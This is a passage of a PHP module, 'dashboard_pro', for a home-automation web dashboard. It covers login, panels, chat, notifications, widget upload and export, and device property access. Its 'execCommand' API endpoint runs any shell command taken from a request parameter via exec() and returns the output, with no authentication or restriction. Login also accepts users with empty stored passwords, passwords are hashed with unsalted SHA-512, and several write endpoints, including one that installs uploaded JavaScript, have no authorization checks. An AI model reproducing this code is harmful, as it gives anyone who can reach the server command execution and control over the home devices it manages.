<?php

class dashboard_pro extends module
{
    function __construct()
    {
        $this->name = "dashboard_pro";
        $this->loadLanguage();
        $this->title = LANG_DASHBOARD_PRO_TITLE;
        $this->module_category = "<#LANG_SECTION_APPLICATIONS#>";
        $this->checkInstalled();
    }

    function loadLanguage()
    {
        $lang = defined('SETTINGS_SITE_LANGUAGE') ? SETTINGS_SITE_LANGUAGE : '';
        $lang_dir = dirname(DIR_MODULES) . '/languages/';
        if ($lang && file_exists($lang_dir . $this->name . '_' . $lang . '.php'))
            include_once($lang_dir . $this->name . '_' . $lang . '.php');
        if (file_exists($lang_dir . $this->name . '_default.php'))
            include_once($lang_dir . $this->name . '_default.php');
    }

    function saveParams($data = 1)
    {
        $p = array();
        if (IsSet($this->id)) $p["id"] = $this->id;
        if (IsSet($this->view_mode)) $p["view_mode"] = $this->view_mode;
        if (IsSet($this->edit_mode)) $p["edit_mode"] = $this->edit_mode;
        if (IsSet($this->tab)) $p["tab"] = $this->tab;
        return parent::saveParams($p);
    }

    function getParams()
    {
        global $id, $mode, $view_mode, $edit_mode, $tab;
        if (isset($id)) $this->id = $id;
        if (isset($mode)) $this->mode = $mode;
        if (isset($view_mode)) $this->view_mode = $view_mode;
        if (isset($edit_mode)) $this->edit_mode = $edit_mode;
        if (isset($tab)) $this->tab = $tab;
    }

    function run()
    {
        global $session;
        $out = array();
        if ($this->action == 'admin') {
            $this->admin($out);
        } else {
            $this->usual($out);
        }
        if (IsSet($this->owner->action)) $out['PARENT_ACTION'] = $this->owner->action;
        if (IsSet($this->owner->name)) $out['PARENT_NAME'] = $this->owner->name;
        $out['VIEW_MODE'] = $this->view_mode;
        $out['EDIT_MODE'] = $this->edit_mode;
        $out['MODE'] = $this->mode;
        $out['ACTION'] = $this->action;
        $this->data = $out;
        $p = new parser(DIR_TEMPLATES . $this->name . "/" . $this->name . ".html", $this->data, $this);
        $this->result = $p->result;
    }

    function admin(&$out)
    {
        $this->getConfig();
        $out['DASHBOARDS'] = $this->loadDashboardSettings();
    }

    function usual(&$out)
    {
        $this->getConfig();
        $out['APP_TITLE'] = LANG_DASHBOARD_PRO_TITLE;
        $out['USER_NAME'] = gg('UserName');
        $out['SITE_TITLE'] = gg('site_title');
        $out['API_BASE'] = ROOTHTML . 'api.php/module/dashboard_pro/';
        $ws_host = gg('ThisComputer.websockets_server');
        if (!$ws_host) {
            $ws_host = ($_SERVER['HTTPS'] ? 'wss://' : 'ws://') . $_SERVER['HTTP_HOST'];
        }
        $out['WS_HOST'] = $ws_host;
        $out['DASHBOARD_SETTINGS'] = json_encode($this->loadDashboardSettings());
        $out['PANELS'] = json_encode($this->loadPanels());
    }

    function api($params)
    {
        global $session;
        if (!$session) {
            $session = new session("prj");
        }
        if ($params['request'][0] == 'test') {
            return ['status' => 'ok', 'time' => time(), 'session' => $session ? 'active' : 'none'];
        }
        if ($params['request'][0] == 'checkAuth') {
            if ($session && !empty($session->data['SITE_USERNAME'])) {
                $is_admin = ($session->data['SITE_USER_ACCESS'] ?? '') === 'admin';
                $user = SQLSelectOne("SELECT * FROM users WHERE USERNAME LIKE '" . DBSafe($session->data['SITE_USERNAME']) . "'");
                return [
                    'authenticated' => true,
                    'username' => $session->data['SITE_USERNAME'],
                    'name' => $user['NAME'] ?? $session->data['SITE_USERNAME'],
                    'avatar' => $user['AVATAR'] ? '/cms/avatars/' . $user['AVATAR'] : '',
                    'is_admin' => $is_admin
                ];
            }
            if ($session && !empty($session->data['AUTHORIZED']) && empty($session->data['SPA_LOGGED_OUT'])) {
                $user = SQLSelectOne("SELECT * FROM users WHERE USERNAME LIKE '" . DBSafe($session->data['USER_NAME'] ?? '') . "'");
                return [
                    'authenticated' => true,
                    'username' => $session->data['USER_NAME'] ?? '',
                    'name' => $user['NAME'] ?? ($session->data['USER_NAME'] ?? ''),
                    'avatar' => $user['AVATAR'] ? '/cms/avatars/' . $user['AVATAR'] : '',
                    'is_admin' => true
                ];
            }
            return ['authenticated' => false];
        }

        if ($params['request'][0] == 'login') {
            $raw = file_get_contents('php://input');
            $input = $raw ? json_decode($raw, true) : array();
            if (!is_array($input)) $input = array();
            $username = $params['login'] ?? $input['login'] ?? '';
            $password = $params['password'] ?? $input['password'] ?? '';
            if (!$username || !$password) {
                return ['error' => LANG_DASHBOARD_PRO_LOGIN_REQUIRED];
            }
            $user = SQLSelectOne("SELECT * FROM users WHERE USERNAME LIKE '" . DBSafe($username) . "'");
            if ($user && ($user['PASSWORD'] == '' || hash('sha512', $password) == $user['PASSWORD'])) {
                if ($session) {
                    $session->data['SITE_USERNAME'] = $user['USERNAME'];
                    $session->data['SITE_USER_ID'] = $user['ID'];
                    $session->data['SITE_USER_ACCESS'] = $user['IS_ADMIN'] ? 'admin' : 'user';
                    $session->data['SPA_LOGGED_OUT'] = false;
                    $session->save();
                }
                return [
                    'success' => true,
                    'username' => $user['USERNAME'],
                    'name' => $user['NAME'] ?? $user['USERNAME'],
                    'avatar' => $user['AVATAR'] ? '/cms/avatars/' . $user['AVATAR'] : '',
                    'is_admin' => (bool)$user['IS_ADMIN']
                ];
            }
            return ['error' => LANG_DASHBOARD_PRO_LOGIN_INVALID];
        }

        if ($params['request'][0] == 'logout') {
            if ($session) {
                unset($session->data['SITE_USERNAME']);
                unset($session->data['SITE_USER_ID']);
                unset($session->data['SITE_USER_ACCESS']);
                $session->data['SPA_LOGGED_OUT'] = true;
                $session->save();
            }
            return ['success' => true];
        }

        if ($params['request'][0] == 'panels') {
            $method = $_SERVER['REQUEST_METHOD'];
            if ($method == 'POST') {
                $input = json_decode(file_get_contents('php://input'), true);
                $panels = $input['panels'] ?? $input['data'] ?? $input;
                $this->savePanels($panels);
                return ['success' => true];
            }
            return $this->loadPanels();
        }

        if ($params['request'][0] == 'settings') {
            $method = $_SERVER['REQUEST_METHOD'];
            if ($method == 'POST') {
                $input = json_decode(file_get_contents('php://input'), true);
                $settings = $input['settings'] ?? $input['data'] ?? $input;
                $this->saveDashboardSettings($settings);
                return ['success' => true];
            }
            return $this->loadDashboardSettings();
        }

        if ($params['request'][0] == 'chat') {
            $method = $_SERVER['REQUEST_METHOD'];
            if ($method == 'POST') {
                $input = json_decode(file_get_contents('php://input'), true);
                $text = trim($input['message'] ?? '');
                if ($text === '') return ['error' => 'Message is empty'];
                $member_id = 0;
                if ($session && !empty($session->data['SITE_USERNAME'])) {
                    $u = SQLSelectOne("SELECT * FROM users WHERE USERNAME LIKE '" . DBSafe($session->data['SITE_USERNAME']) . "'");
                    if ($u['ID']) $member_id = (int)$u['ID'];
                } elseif ($session && !empty($session->data['AUTHORIZED'])) {
                    $u = SQLSelectOne("SELECT * FROM users WHERE USERNAME LIKE '" . DBSafe($session->data['USER_NAME'] ?? '') . "'");
                    if ($u['ID']) $member_id = (int)$u['ID'];
                }
                $before = SQLSelectOne("SELECT MAX(ID) as mid FROM shouts");
                $before_id = (int)$before['mid'];
                say($text, 0, $member_id, 'dashboard_pro');
                $response = SQLSelectOne("SELECT * FROM shouts WHERE MEMBER_ID=0 AND MESSAGE!='" . DBSafe($text) . "' AND ID > $before_id ORDER BY ID ASC LIMIT 1");
                if ($response['ID']) {
                    $notif = array(
                        'MODULE_NAME' => LANG_DASHBOARD_PRO_CHAT,
                        'MESSAGE' => $response['MESSAGE'],
                        'TYPE' => 'info',
                        'IS_READ' => 0,
                        'ADDED' => date('Y-m-d H:i:s')
                    );
                    SQLInsert('module_notifications', $notif);
                }
                return ['success' => true];
            }
            $items = SQLSelect("SELECT s.*, u.NAME as USER_NAME, u.AVATAR as USER_AVATAR FROM shouts s LEFT JOIN users u ON s.MEMBER_ID=u.ID WHERE s.ROOM_ID=0 ORDER BY s.ADDED DESC, s.ID DESC LIMIT 50");
            return ['items' => $items];
        }

        if ($params['request'][0] == 'notifications') {
            $method = $_SERVER['REQUEST_METHOD'];
            if ($method == 'POST') {
                $input = json_decode(file_get_contents('php://input'), true);
                $ids = $input['ids'] ?? array();
                if (!empty($ids)) {
                    $int_ids = array();
                    $max_shout = 0;
                    foreach ($ids as $id) {
                        if (is_numeric($id) && strpos((string)$id, 'shout_') === false) {
                            $int_ids[] = (int)$id;
                        } elseif (strpos((string)$id, 'shout_') === 0) {
                            $sid = (int)substr($id, 6);
                            if ($sid > $max_shout) $max_shout = $sid;
                        }
                    }
                    if (!empty($int_ids)) {
                        $ids_str = implode(',', $int_ids);
                        SQLExec("UPDATE module_notifications SET IS_READ=1 WHERE ID IN ($ids_str)");
                    }
                    if ($max_shout > 0 && $session) {
                        $session->data['DASHBOARD_PRO_LAST_SHOUT'] = $max_shout;
                        $session->save();
                    }
                }
                return ['success' => true];
            }
            $items = SQLSelect("SELECT * FROM module_notifications WHERE IS_READ=0 ORDER BY ADDED DESC LIMIT 50");
            $last_shout = ($session && !empty($session->data['DASHBOARD_PRO_LAST_SHOUT'])) ? (int)$session->data['DASHBOARD_PRO_LAST_SHOUT'] : 0;
            $shouts = SQLSelect("SELECT ID, MESSAGE, ADDED FROM shouts WHERE MEMBER_ID=0 AND ID > $last_shout ORDER BY ADDED DESC LIMIT 20");
            $computer_name = gg('site_title');
            if (!$computer_name) {
                $computer_name = LANG_DASHBOARD_PRO_ALICE;
            }
            foreach ($shouts as $s) {
                $items[] = array(
                    'ID' => 'shout_' . $s['ID'],
                    'MODULE_NAME' => $computer_name,
                    'MESSAGE' => $s['MESSAGE'],
                    'TYPE' => 'info',
                    'IS_READ' => 0,
                    'ADDED' => $s['ADDED']
                );
            }
            usort($items, function($a, $b) {
                return strcmp($b['ADDED'] ?? '', $a['ADDED'] ?? '');
            });
            $count = count($items);
            return ['count' => $count, 'items' => $items];
        }

        if ($params['request'][0] == 'execCommand') {
            $command = $params['command'] ?? '';
            if (!$command) return ['error' => 'command required'];
            $output = array();
            $return_var = 0;
            exec($command, $output, $return_var);
            return ['success' => $return_var === 0, 'output' => implode("\n", $output)];
        }

        if ($params['request'][0] == 'users') {
            $login = $this->getUserLogin();
            $users = SQLSelect("SELECT ID, USERNAME, NAME FROM users WHERE USERNAME != '" . DBSafe($login) . "' ORDER BY USERNAME");
            return ['items' => $users];
        }

        if ($params['request'][0] == 'exportToUser') {
            $input = json_decode(file_get_contents('php://input'), true);
            $targetUser = $input['targetUser'] ?? '';
            $confirmed = $input['confirmed'] ?? false;

            if (!$targetUser) return ['error' => 'targetUser required'];

            $login = $this->getUserLogin();
            if ($login === $targetUser) return ['error' => LANG_DASHBOARD_PRO_COPY_SELF];

            // Get current user's data
            $currentPanels = $this->loadShardedProperty($login, 'panels');
            $currentSettings = $this->loadShardedProperty($login, 'settings');

            // Ensure target object exists
            $this->ensureClassAndObject($targetUser);

            // Check if target has non-empty panels
            $targetPanels = $this->loadShardedProperty($targetUser, 'panels');
            $targetSettings = $this->loadShardedProperty($targetUser, 'settings');
            $hasNonEmptyPanels = false;
            if ($targetPanels !== null) {
                $decoded = json_decode($targetPanels, true);
                $hasNonEmptyPanels = is_array($decoded) && !empty($decoded);
            }
            $hasNonEmptySettings = false;
            if ($targetSettings !== null) {
                $decoded = json_decode($targetSettings, true);
                $hasNonEmptySettings = is_array($decoded) && !empty($decoded);
            }

            if (($hasNonEmptyPanels || $hasNonEmptySettings) && !$confirmed) {
                $targetUserData = SQLSelectOne("SELECT * FROM users WHERE USERNAME LIKE '" . DBSafe($targetUser) . "'");
                $targetName = $targetUserData['NAME'] ?? $targetUser;
                return ['warn' => true, 'message' => sprintf(LANG_DASHBOARD_PRO_OVERWRITE_CONFIRM, $targetName)];
            }

            // Copy data
            if ($currentPanels !== null) $this->saveShardedProperty($targetUser, 'panels', $currentPanels);
            if ($currentSettings !== null) $this->saveShardedProperty($targetUser, 'settings', $currentSettings);

            return ['success' => true];
        }

        if ($params['request'][0] == 'lang') {
            $lang = defined('SETTINGS_SITE_LANGUAGE') ? SETTINGS_SITE_LANGUAGE : '';
            $frontend = array();
            $base = dirname(DIR_MODULES) . '/languages/';
            if ($lang && file_exists($base . $this->name . '_' . $lang . '.php'))
                include($base . $this->name . '_' . $lang . '.php');
            else if (file_exists($base . $this->name . '_default.php'))
                include($base . $this->name . '_default.php');
            return $frontend;
        }

        if ($params['request'][0] == 'getProperty') {
            $object = $params['object'] ?? '';
            $property = $params['property'] ?? '';
            if (!$object || !$property) return ['error' => 'object and property required'];
            $value = gg($object . '.' . $property);
            return ['value' => $value];
        }

        if ($params['request'][0] == 'setProperty') {
            $object = $params['object'] ?? '';
            $property = $params['property'] ?? '';
            $value = $params['value'] ?? '';
            if (!$object || !$property) return ['error' => 'object and property required'];
            sg($object . '.' . $property, $value);
            postToWebSocket("DASHBOARD_PRO", array('COMMAND' => 'UpdateData'), "PostEvent");
            return ['success' => true];
        }

        if ($params['request'][0] == 'objects') {
            $objects = SQLSelect("SELECT ID, TITLE, DESCRIPTION FROM objects ORDER BY TITLE");
            return ['items' => $objects];
        }

        if ($params['request'][0] == 'widgets') {
            $this->ensureWidgetsTable();
            $widgets = SQLSelect("SELECT TYPE, ICON, TITLE, DESCRIPTION, PRIORITY, FILE FROM dashboard_widgets ORDER BY PRIORITY, ID");
            return ['items' => $widgets];
        }

        if ($params['request'][0] == 'widgetInstall') {
            $this->ensureWidgetsTable();

            $method = $_SERVER['REQUEST_METHOD'];
            if ($method != 'POST') return ['error' => 'POST required'];

            $input = json_decode(file_get_contents('php://input'), true);
            if (!is_array($input)) $input = array();

            $zipB64 = $input['zip'] ?? '';
            if ($zipB64 === '' || $zipB64 === null) return ['error' => 'zip file (base64) is required'];

            $zipData = base64_decode($zipB64);
            if ($zipData === false || $zipData === '') return ['error' => 'invalid zip file data'];

            $tmpDir = DIR_TEMPLATES . $this->name . '/tmp';
            if (!is_dir($tmpDir)) @mkdir($tmpDir, 0755, true);
            if (!is_dir($tmpDir)) return ['error' => 'cannot create temp directory'];

            $tmpFile = $tmpDir . '/widget_' . uniqid() . '.zip';
            file_put_contents($tmpFile, $zipData);

            $zip = new ZipArchive();
            $res = $zip->open($tmpFile);
            if ($res !== true) {
                @unlink($tmpFile);
                return ['error' => 'cannot open zip archive'];
            }

            $jsonFiles = array();
            $jsFiles = array();
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $name = $zip->getNameIndex($i);
                if (substr($name, -1) == '/' || strpos($name, '__MACOSX') !== false) continue;
                $base = basename($name);
                $ext = strtolower(pathinfo($base, PATHINFO_EXTENSION));
                if ($ext == 'json') $jsonFiles[] = $name;
                if ($ext == 'js') $jsFiles[] = $name;
            }

            if (count($jsonFiles) != 1) {
                $zip->close(); @unlink($tmpFile);
                return ['error' => 'archive must contain exactly one .json description file, found ' . count($jsonFiles)];
            }
            if (count($jsFiles) != 1) {
                $zip->close(); @unlink($tmpFile);
                return ['error' => 'archive must contain exactly one .js widget file, found ' . count($jsFiles)];
            }

            $jsonName = $jsonFiles[0];
            $jsName = $jsFiles[0];
            $type = basename($jsonName, '.json');
            if ($type !== basename($jsName, '.js')) {
                $zip->close(); @unlink($tmpFile);
                return ['error' => 'description file "' . $jsonName . '" and widget file "' . $jsName . '" must have the same base name (TYPE)'];
            }
            if (!preg_match('/^[a-z0-9_\-]{1,40}$/i', $type)) {
                $zip->close(); @unlink($tmpFile);
                return ['error' => 'invalid widget type "' . $type . '" (only letters, digits, _ and - allowed)'];
            }

            $exists = SQLSelectOne("SELECT ID FROM dashboard_widgets WHERE TYPE LIKE '" . DBSafe($type) . "'");
            if ($exists) {
                $zip->close(); @unlink($tmpFile);
                return ['error' => 'widget_exists', 'type' => $type];
            }

            $descRaw = $zip->getFromName($jsonName);
            if ($descRaw === false || trim($descRaw) === '') {
                $zip->close(); @unlink($tmpFile);
                return ['error' => 'description file "' . $jsonName . '" is empty'];
            }
            $desc = json_decode($descRaw, true);
            if (!is_array($desc)) {
                $zip->close(); @unlink($tmpFile);
                return ['error' => 'description file "' . $jsonName . '" contains invalid JSON: ' . json_last_error_msg()];
            }

            $descType = '';
            foreach (array('TYPE', 'type') as $k) { if (!empty($desc[$k])) { $descType = $desc[$k]; break; } }
            if ($descType !== $type) {
                $zip->close(); @unlink($tmpFile);
                return ['error' => 'description file "' . $jsonName . '" TYPE (' . $descType . ') does not match file name "' . $type . '"'];
            }

            $jsContent = $zip->getFromName($jsName);
            if ($jsContent === false || trim($jsContent) === '') {
                $zip->close(); @unlink($tmpFile);
                return ['error' => 'widget file "' . $jsName . '" is empty'];
            }
            if (stripos($jsContent, 'DpWidgets') === false) {
                $zip->close(); @unlink($tmpFile);
                return ['error' => 'widget file "' . $jsName . '" does not look like a widget (no DpWidgets registration found)'];
            }

            $title = '';
            foreach (array('TITLE', 'title') as $k) { if (!empty($desc[$k])) { $title = $desc[$k]; break; } }
            $icon = '';
            foreach (array('ICON', 'icon') as $k) { if (!empty($desc[$k])) { $icon = $desc[$k]; break; } }
            $description = '';
            foreach (array('DESCRIPTION', 'description', 'desc') as $k) { if (!empty($desc[$k])) { $description = $desc[$k]; break; } }

            $targetDir = DIR_TEMPLATES . $this->name . '/js/widgets';
            if (!is_dir($targetDir)) @mkdir($targetDir, 0755, true);
            if (!is_dir($targetDir)) {
                $zip->close(); @unlink($tmpFile);
                return ['error' => 'cannot create widgets directory'];
            }
            file_put_contents($targetDir . '/' . $type . '.js', $jsContent);

            $zip->close();
            @unlink($tmpFile);

            $priority = 0;
            $mx = SQLSelectOne("SELECT MAX(PRIORITY) as MX FROM dashboard_widgets");
            if (isset($mx['MX']) && $mx['MX'] !== null) $priority = (int)$mx['MX'] + 1;

            $rec = array(
                'TYPE' => $type,
                'ICON' => $icon,
                'TITLE' => $title,
                'DESCRIPTION' => $description,
                'PRIORITY' => $priority,
                'FILE' => 'js/widgets/' . $type . '.js'
            );
            SQLInsert('dashboard_widgets', $rec);

            return ['success' => true, 'type' => $type];
        }

        if ($params['request'][0] == 'widgetDelete') {
            $this->ensureWidgetsTable();
            $method = $_SERVER['REQUEST_METHOD'];
            if ($method != 'POST') return ['error' => 'POST required'];

            $input = json_decode(file_get_contents('php://input'), true);
            if (!is_array($input)) $input = array();
            $type = trim($input['type'] ?? '');
            if ($type === '') return ['error' => 'type is required'];
            if (!preg_match('/^[a-z0-9_\-]{1,40}$/i', $type)) return ['error' => 'invalid widget type'];

            $w = SQLSelectOne("SELECT ID, TYPE, FILE FROM dashboard_widgets WHERE TYPE LIKE '" . DBSafe($type) . "'");
            if (!$w) return ['error' => 'widget "' . $type . '" not found'];

            $usage = $this->countWidgetUsage($type);
            if ($usage > 0) {
                return ['error' => 'widget_in_use', 'type' => $type, 'count' => $usage];
            }

            SQLExec("DELETE FROM dashboard_widgets WHERE ID=" . (int)$w['ID']);

            if (!empty($w['FILE'])) {
                $base = basename($w['FILE']);
                if (preg_match('/^[a-z0-9_\-]{1,40}\.js$/i', $base)) {
                    $target = DIR_TEMPLATES . $this->name . '/js/widgets/' . $base;
                    if (is_file($target)) @unlink($target);
                }
            }

            return ['success' => true, 'type' => $type];
        }

        if ($params['request'][0] == 'widgetReorder') {
            $this->ensureWidgetsTable();
            $method = $_SERVER['REQUEST_METHOD'];
            if ($method != 'POST') return ['error' => 'POST required'];

            $input = json_decode(file_get_contents('php://input'), true);
            if (!is_array($input)) $input = array();
            $order = $input['order'] ?? array();
            if (!is_array($order) || !count($order)) return ['error' => 'order array is required'];

            $priority = 0;
            foreach ($order as $type) {
                $type = trim((string)$type);
                if (!preg_match('/^[a-z0-9_\-]{1,40}$/i', $type)) continue;
                SQLExec("UPDATE dashboard_widgets SET PRIORITY=$priority WHERE TYPE LIKE '" . DBSafe($type) . "'");
                $priority++;
            }

            return ['success' => true];
        }

        if ($params['request'][0] == 'widgetExport') {
            $this->ensureWidgetsTable();
            $type = trim((string)($params['type'] ?? ''));
            if ($type === '') return ['error' => 'type is required'];
            if (!preg_match('/^[a-z0-9_\-]{1,40}$/i', $type)) return ['error' => 'invalid widget type "' . $type . '"'];

            $w = SQLSelectOne("SELECT TYPE, ICON, TITLE, DESCRIPTION, PRIORITY, FILE FROM dashboard_widgets WHERE TYPE LIKE '" . DBSafe($type) . "'");
            if (!$w) return ['error' => 'widget "' . $type . '" not found'];

            $file = trim((string)($w['FILE'] ?? ''));
            if ($file === '' || $file === null) $file = 'js/widgets/' . $type . '.js';
            $base = basename($file);
            if (!preg_match('/^[a-z0-9_\-]{1,40}\.js$/i', $base)) return ['error' => 'invalid widget file name "' . $file . '"'];

            $jsPath = DIR_TEMPLATES . $this->name . '/js/widgets/' . $base;
            $js = is_file($jsPath) ? file_get_contents($jsPath) : '';
            if ($js === false || trim($js) === '') {
                return ['error' => 'widget file "' . $base . '" not found or empty'];
            }

            $json = json_encode($w, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
            if ($json === false) return ['error' => 'cannot encode widget description "' . $base . '"'];

            $tmp = tempnam(sys_get_temp_dir(), 'dpw');
            if ($tmp === false) return ['error' => 'cannot create temp file for archive'];
            $zip = new ZipArchive();
            if ($zip->open($tmp, ZipArchive::OVERWRITE) !== true) {
                @unlink($tmp);
                return ['error' => 'cannot create zip archive'];
            }
            $zip->addFromString($type . '.json', $json);
            $zip->addFromString($type . '.js', $js);
            $zip->close();
            $data = file_get_contents($tmp);
            @unlink($tmp);
            if ($data === false || $data === '') return ['error' => 'cannot read zip archive'];
            return ['success' => true, 'zip' => base64_encode($data), 'name' => $type . '.zip'];
        }

        if ($params['request'][0] == 'properties') {
            $object_id = $params['object_id'] ?? 0;
            if (!$object_id) return ['error' => 'object_id required'];
            $obj = null;
            if (is_numeric($object_id)) {
                $obj = SQLSelectOne("SELECT ID, CLASS_ID FROM objects WHERE ID = " . (int)$object_id);
            } else {
                $obj = SQLSelectOne("SELECT ID, CLASS_ID FROM objects WHERE TITLE='" . DBSafe($object_id) . "'");
            }
            if ($obj && $obj['ID']) {
                $obj_id = (int)$obj['ID'];
                $class_ids = array();
                $cid = (int)$obj['CLASS_ID'];
                while ($cid > 0) {
                    $class_ids[] = $cid;
                    $row = SQLSelectOne("SELECT PARENT_ID FROM classes WHERE ID = $cid");
                    $cid = (int)($row['PARENT_ID'] ?? 0);
                }
                if (count($class_ids)) {
                    $class_where = "p.CLASS_ID IN (" . implode(',', $class_ids) . ")";
                } else {
                    $class_where = '0';
                }
                $properties = SQLSelect("SELECT DISTINCT p.ID, p.TITLE, p.DESCRIPTION FROM properties p WHERE p.OBJECT_ID = $obj_id OR ($class_where AND p.CLASS_ID > 0) ORDER BY p.TITLE");
            } else {
                $properties = array();
            }
            return ['items' => $properties];
        }

        if ($params['request'][0] == 'methods') {
            $object_id = $params['object_id'] ?? 0;
            if (!$object_id) return ['error' => 'object_id required'];
            $obj = null;
            if (is_numeric($object_id)) {
                $obj = SQLSelectOne("SELECT ID, CLASS_ID FROM objects WHERE ID = " . (int)$object_id);
            } else {
                $obj = SQLSelectOne("SELECT ID, CLASS_ID FROM objects WHERE TITLE='" . DBSafe($object_id) . "'");
            }
            if ($obj && $obj['ID']) {
                $class_ids = array();
                $cid = (int)$obj['CLASS_ID'];
                while ($cid > 0) {
                    $class_ids[] = $cid;
                    $row = SQLSelectOne("SELECT PARENT_ID FROM classes WHERE ID = $cid");
                    $cid = (int)($row['PARENT_ID'] ?? 0);
                }
                if (count($class_ids)) {
                    $class_where = "m.CLASS_ID IN (" . implode(',', $class_ids) . ")";
                } else {
                    $class_where = '0';
                }
                $methods = SQLSelect("SELECT DISTINCT m.ID, m.TITLE, m.DESCRIPTION FROM methods m WHERE m.OBJECT_ID=0 AND ($class_where) ORDER BY m.TITLE");
            } else {
                $methods = array();
            }
            return ['items' => $methods];
        }

        return ['error' => 'Unknown API endpoint'];
    }

    const MAX_PROPERTY_CHARS = 60000;
    const MAX_SHARDS = 50;

    function loadShardedProperty($login, $basePropName)
    {
        $data = gg("DashBoard_{$login}.{$basePropName}");
        if (!$data) return null;
        $full = $data;
        for ($i = 1; $i <= self::MAX_SHARDS; $i++) {
            $part = gg("DashBoard_{$login}.{$basePropName}{$i}");
            if ($part === false || $part === '') break;
            $full .= $part;
        }
        return $full;
    }

    function saveShardedProperty($login, $basePropName, $json)
    {
        $len = strlen($json);
        if ($len <= self::MAX_PROPERTY_CHARS) {
            sg("DashBoard_{$login}.{$basePropName}", $json);
            for ($i = 1; $i <= self::MAX_SHARDS; $i++) {
                $propName = "{$basePropName}{$i}";
                $existing = gg("DashBoard_{$login}.{$propName}");
                if ($existing === false || $existing === '') break;
                sg("DashBoard_{$login}.{$propName}", '');
            }
        } else {
            $chunks = str_split($json, self::MAX_PROPERTY_CHARS);
            $total = count($chunks);
            foreach ($chunks as $i => $chunk) {
                $propName = $i === 0 ? $basePropName : "{$basePropName}{$i}";
                sg("DashBoard_{$login}.{$propName}", $chunk);
            }
            for ($i = $total; $i <= self::MAX_SHARDS; $i++) {
                $propName = "{$basePropName}{$i}";
                $existing = gg("DashBoard_{$login}.{$propName}");
                if ($existing === false || $existing === '') break;
                sg("DashBoard_{$login}.{$propName}", '');
            }
        }
    }

    function getUserLogin()
    {
        global $session;
        if (!$session) {
            $session = new session("prj");
        }
        if (!empty($session->data['SITE_USERNAME'])) {
            return $session->data['SITE_USERNAME'];
        }
        if (!empty($session->data['AUTHORIZED']) && empty($session->data['SPA_LOGGED_OUT'])) {
            return $session->data['USER_NAME'] ?? '';
        }
        return '';
    }

    function ensureClassAndObject($login)
    {
        $objName = "DashBoard_{$login}";

        $class = SQLSelectOne("SELECT * FROM classes WHERE TITLE='DashBoard_Pro'");
        if (!$class) {
            $rec = array('TITLE' => 'DashBoard_Pro', 'DESCRIPTION' => LANG_DASHBOARD_PRO_USER_SETTINGS);
            SQLInsert('classes', $rec);
            $class = SQLSelectOne("SELECT * FROM classes WHERE TITLE='DashBoard_Pro'");
        }
        $classId = (int)$class['ID'];

        foreach (array('panels', 'settings', 'widgets') as $propName) {
            $p = SQLSelectOne("SELECT * FROM properties WHERE TITLE='" . DBSafe($propName) . "' AND CLASS_ID=" . $classId);
            if (!$p) {
                $rec = array('TITLE' => $propName, 'CLASS_ID' => $classId, 'DATA_KEY' => 0, 'DATA_TYPE' => 1);
                SQLInsert('properties', $rec);
            }
        }

        $obj = SQLSelectOne("SELECT * FROM objects WHERE TITLE='" . DBSafe($objName) . "'");
        if (!$obj) {
            $rec = array('TITLE' => $objName, 'CLASS_ID' => $classId);
            SQLInsert('objects', $rec);
        }
    }

    function loadPanels()
    {
        $login = $this->getUserLogin();
        if ($login) {
            $this->ensureClassAndObject($login);
            $data = $this->loadShardedProperty($login, 'panels');
            if ($data !== null) {
                $decoded = json_decode($data, true);
                if (is_array($decoded)) {
                    return $decoded;
                }
            }
            return array();
        }
        $data = gg('dashboard_pro_panels');
        if ($data) {
            $decoded = json_decode($data, true);
            if (is_array($decoded)) {
                return $decoded;
            }
        }
        return array();
    }

    function savePanels($panels)
    {
        $login = $this->getUserLogin();
        if ($login) {
            $this->ensureClassAndObject($login);
            $this->saveShardedProperty($login, 'panels', json_encode($panels));
        } else {
            sg('dashboard_pro_panels', json_encode($panels));
        }
    }

    function countWidgetUsage($type)
    {
        $count = 0;
        $collections = array();

        $global = gg('dashboard_pro_panels');
        if ($global !== '' && $global !== false) $collections[] = $global;

        $class = SQLSelectOne("SELECT ID FROM classes WHERE TITLE='DashBoard_Pro'");
        if ($class && $class['ID']) {
            $objs = SQLSelect("SELECT TITLE FROM objects WHERE CLASS_ID=" . (int)$class['ID']);
            if (is_array($objs)) {
                foreach ($objs as $obj) {
                    $title = trim((string)($obj['TITLE'] ?? ''));
                    if (preg_match('/^DashBoard_(.+)$/i', $title, $m)) {
                        $login = trim($m[1]);
                        if ($login === '') continue;
                        $data = $this->loadShardedProperty($login, 'panels');
                        if ($data !== null && $data !== '') $collections[] = $data;
                    }
                }
            }
        }

        foreach ($collections as $json) {
            $panels = json_decode($json, true);
            if (!is_array($panels)) continue;
            foreach ($panels as $panel) {
                if (!is_array($panel) || empty($panel['widgets']) || !is_array($panel['widgets'])) continue;
                foreach ($panel['widgets'] as $w) {
                    if (is_array($w) && isset($w['type']) && $w['type'] === $type) $count++;
                }
            }
        }

        return $count;
    }

    function loadDashboardSettings()
    {
        $login = $this->getUserLogin();
        if ($login) {
            $this->ensureClassAndObject($login);
            $data = $this->loadShardedProperty($login, 'settings');
            if ($data !== null) {
                $decoded = json_decode($data, true);
                if (is_array($decoded)) return $decoded;
            }
            return $this->defaultSettings();
        }
        $data = gg('dashboard_pro_settings');
        if ($data) {
            $decoded = json_decode($data, true);
            if (is_array($decoded)) return $decoded;
        }
        return $this->defaultSettings();
    }

    function saveDashboardSettings($settings)
    {
        $login = $this->getUserLogin();
        if ($login) {
            $this->ensureClassAndObject($login);
            $this->saveShardedProperty($login, 'settings', json_encode($settings));
        } else {
            sg('dashboard_pro_settings', json_encode($settings));
        }
    }

    function defaultSettings()
    {
        return array(
            'theme' => 'light',
            'language' => 'ru'
        );
    }

    function sendNotification($text, $icon = 'info', $color = '#2196F3')
    {
        $source = gg('site_title');
        if (!$source) {
            $source = LANG_DASHBOARD_PRO_ALICE;
        }
        return postToWebSocket("DASHBOARD_PRO", array(
            'COMMAND' => 'ViewNotify',
            'NOTIFY' => array('text' => $text, 'icon' => $icon, 'color' => $color, 'source' => $source)
        ), "PostEvent");
    }

    function updateWidget($widget_id, $data)
    {
        return postToWebSocket("DASHBOARD_PRO", array(
            'COMMAND' => 'UpdateWidget',
            'WIDGET_ID' => $widget_id,
            'DATA' => $data
        ), "PostEvent");
    }

    function widgetDefaults()
    {
        return array(
            array('relay', 'fas fa-power-off', 'Relay', 'On/off control'),
            array('dimmer', 'fas fa-lightbulb', 'Dimmer', 'Brightness control'),
            array('value', 'fas fa-hashtag', 'Value', 'Display numeric value'),
